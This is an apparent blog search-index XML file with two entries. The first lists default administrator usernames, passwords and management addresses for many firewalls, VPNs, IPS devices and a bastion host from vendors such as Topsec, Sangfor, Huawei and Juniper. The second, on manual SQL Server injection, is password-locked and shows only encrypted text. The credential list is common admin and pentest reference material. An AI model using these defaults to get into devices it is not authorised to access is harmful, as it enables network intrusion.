<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[网络设备的默认密码(交换机、路由器、安全设备)]]></title>
    <url>%2Farchives%2Ffcea265e.html</url>
    <content type="text"><![CDATA[网络设备的默认密码天融信防火墙，不需要证书 登录地址:https://192.168.1.254 用户名:superman 密码:talent 技术支持热线：8008105119 天融信防火墙，不需要证书 登录地址:https://192.168.1.254：8080 用户名:superman 密码:talent！23 遇到设备需要把旧设备配置备份下来，再倒入新设备基于console口登陆，用户名，密码跟web界面一致 system config reset 清除配置 save 保存 联想网御防火墙，需要证书（最好用IE浏览器登录）登录地址:https://10.1.5.254:8889 用户名:admin 密码:leadsec@7766、administrator、bane@7766 技术支持热线：4008107766 010-56632666 深信服防火墙（注安全设备管理地址不是唯一的） https://10.251.251.251 https://10.254.254.254 用户名：admin 密码：admin 技术支持热线：4006306430 启明星辰 https://10.1.5.254:8889 用户名：admin 密码：bane@7766 https://10.50.10.45:8889 用户名：admin 密码：admin@123 电脑端IP：10.50.10.44/255.255.255.0 技术支持热线：4006243900 juniper 登录地址:https://192.168.1.1 用户名:netscreen 密码:netscreen Cisco 登录地址:https://192.168.0.1 用户名:admin 密码:cisco Huawei 登录地址:http://192.168.0.1 用户名:admin 密码:Admin@123 H3C 登录地址:http://192.168.0.1 用户名:admin 密码:admin 技术支持热线：4006306430 绿盟IPS https://192.168.1.101 用户名: weboper 密码: weboper 配置重启生效 网神防火墙GE1口 https://10.50.10.45 用户名：admin 密码：firewall 技术支持热线：4006108220 深信服VPN： 51111端口 delanrecover 华为VPN：账号：root 密码：mduadmin 华为防火墙： admin Admin@123 eudemon eudemon Juniper防火墙： netscreen netscreen 迪普 192.168.0.1 默认的用户名和密码（admin/admin_default) 山石 192.168.1.1 默认的管理账号为hillstone，密码为hillstone 安恒的明御防火墙 admin/adminadmin 某堡垒机 shterm/shterm 天融信的vpn test/123456]]></content>
      <categories>
        <category>知识普及</category>
      </categories>
      <tags>
        <tag>默认密码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL Sever手工注入及技术总计]]></title>
    <url>%2Farchives%2Fd0f5ccf3.html</url>
    <content type="text"><![CDATA[Please enter the password to read the blog. Incorrect Password! No content to display! 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